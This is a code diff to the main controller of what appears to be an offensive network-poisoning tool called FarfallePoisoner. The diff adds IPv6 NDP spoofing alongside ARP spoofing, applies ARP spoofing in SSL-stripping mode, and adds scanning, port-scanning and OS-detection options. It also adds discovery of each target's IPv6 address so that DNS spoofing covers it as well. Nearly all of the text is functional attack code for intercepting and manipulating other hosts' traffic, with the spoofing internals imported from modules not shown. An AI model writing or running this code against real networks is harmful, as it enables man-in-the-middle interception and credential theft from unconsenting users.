@@ -9,27 +9,22 @@ from scapy.layers.inet import IP
 
 from modules.arp_spoofer import ARPSpoofer
 from modules.dns_spoofer import DNSSpoofer
+from modules.ndp_spoofer import NDPSpoofer
 from modules.ssl_stripper import SSLStripper
 from utils.network_scanner import NetworkScanner
 from utils.packet_handler import PacketHandler
+from utils.lib import ColoredFormatter, HAS_COLOR
+from colorama import init, Fore, Style
 
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
-)
-logger = logging.getLogger('FarfallePoisoner')
+logger = logging.getLogger("FarfallePoisoner")
 
-# So important B) would like to use it more but sigh idk maybe later
-try:
-    from colorama import init, Fore, Style
-    init(autoreset=True)
-    HAS_COLOR = True
-except ImportError:
-    HAS_COLOR = False
+handler = logging.StreamHandler()
+handler.setFormatter(ColoredFormatter(
+    '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+))
 
-    class Dummy:
-        def __getattr__(self, name): return ""
-    Fore = Style = Dummy()
+logging.root.setLevel(logging.INFO)
+logging.root.handlers = [handler]
 
 
 class FarfallePoisoner:
@@ -54,20 +49,34 @@ class FarfallePoisoner:
             self.interface, self.gateway_ip, self.target_ips)
 
         self.arp_spoofers = {}  # mapahash
+        self.ndp_spoofers = {}
         self.dns_spoofer = None
         self.ssl_stripper = None
 
-        if self.mode in ['arp', 'all']:
+        if self.mode in ['arp', 'all', 'ssl']:
             try:
                 for target_ip in self.target_ips:
-                    self.arp_spoofers[target_ip] = ARPSpoofer(
-                        interface=self.interface,
-                        target_ip=target_ip,
-                        gateway_ip=self.gateway_ip,
-                        packet_handler=self.packet_handler
-                    )
+                    if ':' in target_ip:  # IPv6 address
+                        if ':' not in self.gateway_ip:
+                            logger.warning(
+                                f"IPv6 target {target_ip} but gateway is IPv4. Skipping NDP spoofing.")
+                            continue
+
+                        self.ndp_spoofers[target_ip] = NDPSpoofer(
+                            interface=self.interface,
+                            target_ipv6=target_ip,
+                            gateway_ipv6=self.gateway_ip,
+                            packet_handler=self.packet_handler
+                        )
+                    else:  # IPv4 address
+                        self.arp_spoofers[target_ip] = ARPSpoofer(
+                            interface=self.interface,
+                            target_ip=target_ip,
+                            gateway_ip=self.gateway_ip,
+                            packet_handler=self.packet_handler
+                        )
             except ValueError as e:
-                logger.error(f"Failed to initialize ARP spoofer: {e}")
+                logger.error(f"Failed to initialize spoofer: {e}")
                 sys.exit(1)
 
         if self.mode in ['dns', 'all']:
@@ -141,7 +150,15 @@ class FarfallePoisoner:
         parser.add_argument('--silent', action='store_true',
                             help='Minimize output (only errors)')
         parser.add_argument('--scan', action='store_true',
-                            help='Scan network for hosts before starting')
+                            help='Perform network scan before attack')
+        parser.add_argument('--scan-range',
+                            help='IP range to scan (default: auto-detect)')
+
+        parser.add_argument('--scan-ports', action='store_true',
+                            help='Include port scanning')
+
+        parser.add_argument('--detect-os', action='store_true',
+                            help='Attempt OS detection')
         parser.add_argument('--dns-domains', nargs='+',
                             help='Additional domains to spoof (e.g., --dns-domains example.com test.com)')
 
@@ -169,10 +186,82 @@ class FarfallePoisoner:
     def start(self):
         """Start the attack based on selected mode"""
 
+        # If scan flag is set, do comprehensive scan
         if self.args.scan:
-            self._scan_network()
-            if not input("Continue with attack? (y/n): ").lower().startswith('y'):
-                return
+            logger.info("Starting network discovery...")
+
+            # Determine scan range
+            if self.args.scan_range:
+                scan_range = self.args.scan_range
+            else:
+                # Auto-detect local subnet
+                local_ip = self.scanner.local_ip
+                if local_ip:
+                    # Convert to /24 subnet
+                    parts = local_ip.split('.')
+                    parts[-1] = '0/24'
+                    scan_range = '.'.join(parts)
+                else:
+                    logger.error("Could not determine local subnet")
+                    return
+
+            # Perform comprehensive scan
+            results = self.scanner.scan(
+                scan_range,
+                scan_ipv6=True,
+                scan_ports=self.args.scan_ports,
+                detect_os=self.args.detect_os
+            )
+
+            print(results)
+
+            # If targets not specified, let user choose
+            if not self.target_ips:
+                print("\nSelect target(s) from the scan results.")
+                print("You can now run the attack with specific targets.")
+
+            return
+
+        # Enhanced target discovery for dual-stack
+        logger.info("Discovering target details...")
+
+        # For each IPv4 target, also find its IPv6 address
+        enhanced_targets = []
+        for target_ip in self.target_ips:
+            details = self.scanner.discover_target_details(target_ip)
+
+            if details['alive']:
+                enhanced_targets.append(target_ip)
+
+                # If target has IPv6 and we're doing DNS spoofing, add it
+                if details.get('ipv6') and self.mode in ['dns', 'all']:
+                    logger.info(
+                        f"Target {target_ip} also has IPv6: {details['ipv6']}")
+                    enhanced_targets.append(details['ipv6'])
+
+                    # Need NDP spoofer for IPv6
+                    if ':' in self.gateway_ip:  # Have IPv6 gateway
+                        self.ndp_spoofers[details['ipv6']] = NDPSpoofer(
+                            interface=self.interface,
+                            target_ipv6=details['ipv6'],
+                            gateway_ipv6=self.gateway_ip,
+                            packet_handler=self.packet_handler
+                        )
+
+                # Show target info
+                logger.info(f"Target {target_ip}:")
+                logger.info(
+                    f"  MAC: {details['mac']} ({details.get('vendor', 'Unknown')})")
+                logger.info(f"  OS: {details['os']}")
+                if details['open_ports']:
+                    logger.info(
+                        f"  Open ports: {[p['port'] for p in details['open_ports']]}")
+
+        # Update target list with enhanced targets
+        self.target_ips = enhanced_targets
+
+        if not input("Continue with attack? (y/n): ").lower().startswith('y'):
+            return
 
         logger.info(f"Starting Farfalle Poisoner in {self.mode} mode")
         logger.info(
@@ -218,6 +307,15 @@ class FarfallePoisoner:
                         logger.info(
                             f"[VONGOLE] ARP spoofing active for {target_ip}")
                 logger.info("[VONGOLE] ARP spoofing active")
+                time.sleep(2)
+
+            if self.ndp_spoofers:
+                for target_ip, spoofer in self.ndp_spoofers.items():
+                    spoofer.start()
+                    if self.verbose:
+                        logger.info(
+                            f"[VONGOLE] NDP spoofing active for {target_ip}")
+                logger.info("[VONGOLE] NDP spoofing active")
                 time.sleep(2)
 
             if self.dns_spoofer:
@@ -291,6 +389,10 @@ class FarfallePoisoner:
 
         if self.arp_spoofers:
             for spoofer in self.arp_spoofers.values():
+                spoofer.stop()
+
+        if self.ndp_spoofers:
+            for spoofer in self.ndp_spoofers.values():
                 spoofer.stop()
 
         # Stop packet handler
